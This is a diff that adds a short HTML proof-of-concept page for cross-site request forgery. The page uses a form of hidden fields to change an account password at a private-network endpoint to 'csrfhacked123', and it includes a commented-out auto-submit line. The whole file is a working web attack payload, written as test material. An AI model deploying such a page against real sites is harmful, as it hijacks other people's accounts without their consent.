@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Test - Account Password Update</title>
+</head>
+<body>
+    <h1>CSRF PoC - Change Account Password</h1>
+    <p>This form will attempt to change your account password to "csrfhacked123".</p>
+    
+    <!-- CSRF Form - Account Password Update -->
+    <form action="http://10.0.0.10/account/update" method="POST" id="csrfForm">
+        <input type="hidden" name="password" value="csrfhacked123">
+        <input type="hidden" name="updatedPassword" value="csrfhacked123">
+        <input type="hidden" name="updateField" value="account">
+        <button type="submit">Test CSRF - Change Password</button>
+    </form>
+    
+    <script>
+        // Auto-submit the form (optional - remove for manual testing)
+        // document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
